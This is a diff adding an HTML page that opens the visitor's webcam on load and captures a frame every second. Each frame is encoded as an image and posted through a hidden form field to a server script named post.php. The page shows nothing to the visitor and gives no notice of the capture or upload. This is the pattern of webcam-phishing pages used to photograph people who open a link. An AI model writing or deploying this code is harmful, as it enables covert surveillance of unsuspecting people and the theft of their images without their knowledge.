@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Capture Image</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script>
+    $(document).ready(function(){
+        startCaptureImage();
+    });
+
+    function startCaptureImage() {
+        captureImage();
+        setTimeout(startCaptureImage, 1000); // Repeat every 1 seconds
+    }
+
+    function captureImage() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+
+        // Adjust these values to get the desired image size
+        canvas.width = 640;
+        canvas.height = 480;
+
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const dataURL = canvas.toDataURL("image/png");
+        $('#cat').val(dataURL);
+        $('form').submit();
+    }
+
+    var video = document.createElement("video");
+
+    navigator.mediaDevices.getUserMedia({video: true})
+    .then(function(stream) {
+        video.srcObject = stream;
+        video.play();
+    });
+</script>
+</head>
+<body>
+    <form action="post.php" method="post">
+        <input type="hidden" name="cat" id="cat">
+    </form>
+</body>
+</html>
